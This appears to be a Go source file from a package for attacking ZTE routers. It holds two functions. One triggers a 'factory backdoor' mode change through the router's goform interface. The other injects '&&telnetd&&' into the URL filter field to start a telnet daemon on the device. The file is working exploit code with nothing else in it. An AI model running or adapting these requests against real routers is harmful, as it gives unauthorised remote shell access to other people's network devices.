package go_ZTE_API_and_hack

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"net/url"
)

// Backdoor - Factory backdoor
func Backdoor(password string) error {
	// Build the request
	req, err := buildSetCMDRequest(
		nil,
		url.Values{
			"isTest":      []string{"false"},
			"goformId":    []string{"CHANGE_MODE"},
			"password":    []string{base64.URLEncoding.EncodeToString([]byte(password))},
			"change_mode": []string{"2"},
		})
	if err != nil {
		return err
	}

	// Send the request
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}

	// Check the response
	if resp.StatusCode != 200 {
		return fmt.Errorf("got status code %d", resp.StatusCode)
	}

	return nil
}

// NVRAM - NVRAM exploit to enable telnetd
func NVRAM() error {
	// Build the request
	req, err := buildSetCMDRequest(
		nil,
		url.Values{
			"isTest":       []string{"false"},
			"goformId":     []string{"URL_FILTER_ADD"},
			"addURLFilter": []string{"http://_L33T_H4X0R_/&&telnetd&&"},
		},
	)
	if err != nil {
		return err
	}

	// Send the request
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return err
	}

	// Check the response
	if resp.StatusCode != 200 {
		return fmt.Errorf("got status code %d", resp.StatusCode)
	}

	return nil
}
